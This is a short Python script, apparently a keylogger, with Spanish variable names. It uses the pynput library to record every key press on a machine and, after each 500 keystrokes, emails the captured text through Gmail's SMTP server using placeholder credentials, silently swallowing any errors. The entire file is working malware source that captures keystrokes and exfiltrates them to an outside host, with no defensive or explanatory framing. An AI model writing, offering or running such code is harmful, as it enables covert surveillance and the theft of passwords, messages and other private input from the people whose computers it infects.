from pynput.keyboard import Key, Listener
import smtplib

cont = 0

records = ''

def send_mail(message):

    usuario = 'correo@gmail.com'
    password = 'pass'
    From = 'correo@gmail.com'
    To = 'correo@gmail.com'

    try:
        server = smtplib.SMTP ("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(usuario, password)
        server.sendmail(From, To, message)
        server.close()
    except:
        pass

def puls(key):

    global cont
    global records

    cont += 1

    puls = str(key)
    
    delchar = puls[:1]

    if delchar == 'u':
        newstr = puls[2] + "  "
        records += newstr
    else:
        str2 = puls + "  "
        records += str2

    if cont == 500:
        send_mail(records)
        records = ''
        cont = 0

with Listener(on_press=puls) as listener:
    listener.join()

